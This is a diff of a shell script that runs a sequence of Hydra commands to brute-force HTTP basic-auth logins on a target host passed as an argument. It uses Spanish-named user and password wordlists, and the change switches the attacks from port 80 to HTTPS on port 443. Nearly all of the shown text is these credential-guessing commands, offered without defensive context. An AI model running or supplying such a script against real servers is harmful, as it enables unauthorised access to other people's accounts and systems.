@@ -43,10 +43,11 @@ if [ -z "$1" ]; then
 fi
 echo
 echo
-hydra -L usuarios0.txt -P claves0.txt -s 80 -f $1 http-get / -e nsr -w 20 -t 3
-hydra -L usuarios.txt -P claves0.txt -s 80 -f $1 http-get /
-hydra -L usuarios.txt -P claves.txt -s 80 -f $1 http-get /
-hydra -L usuarios0.txt -P claves.txt -s 80 -f $1 http-get /
-hydra -L usuarios.txt -P claves.txt -s 80 -f $1 http-get /
-hydra -L usuarios.txt -P claves2.txt -s 80 -f $1 http-get /
-hydra -L usuarios0.txt -P claves2.txt -s 80 -f $1 http-get /
+hydra -S -L usuarios0.txt -P claves0.txt -s 443 -f $1 http-get / -e nsr -w 20 -t 3
+hydra -S -L usuarios.txt -P claves0.txt -s 443 -f $1 http-get /
+hydra -S -L usuarios.txt -P claves.txt -s 443 -f $1 http-get /
+hydra -S -L usuarios0.txt -P claves.txt -s 443 -f $1 http-get /
+hydra -S -L usuarios.txt -P claves.txt -s 443 -f $1 http-get /
+hydra -S -L usuarios.txt -P claves2.txt -s 443 -f $1 http-get /
+hydra -S -L usuarios0.txt -P claves2.txt -s 443 -f $1 http-get /
+
